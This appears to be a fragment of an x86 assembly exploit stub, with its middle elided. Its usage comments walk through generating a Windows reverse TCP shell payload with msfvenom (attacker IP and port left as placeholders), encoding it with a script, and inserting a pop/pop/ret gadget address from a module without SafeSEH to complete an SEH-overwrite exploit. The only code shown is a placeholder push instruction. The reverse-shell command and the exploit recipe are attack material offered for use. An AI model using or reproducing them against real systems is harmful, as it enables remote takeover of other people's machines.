...
;USAGE:
;
; Step 1: Generating decoder.asm
;   msfvenom -p windows/shell_reverse_tcp lhost=XXX.XXX.XXX.XXX lport=XXXX -a x86 --platform win -f raw -o /tmp/reverse_shell.o
;   cat /tmp/reverse_shell.o | ./encoder.py
;
; Step 2: Change PLACEHOLDER bellow
;   find a non-safeseh protected pointer to pop/pop/ret and put it in the placeholder below
;
; Step 3: Mounting to use into your exploit
...
_start:
    ...
    push 0x41414141             ; Replace with P/P/R address  ** PLACEHOLDER **
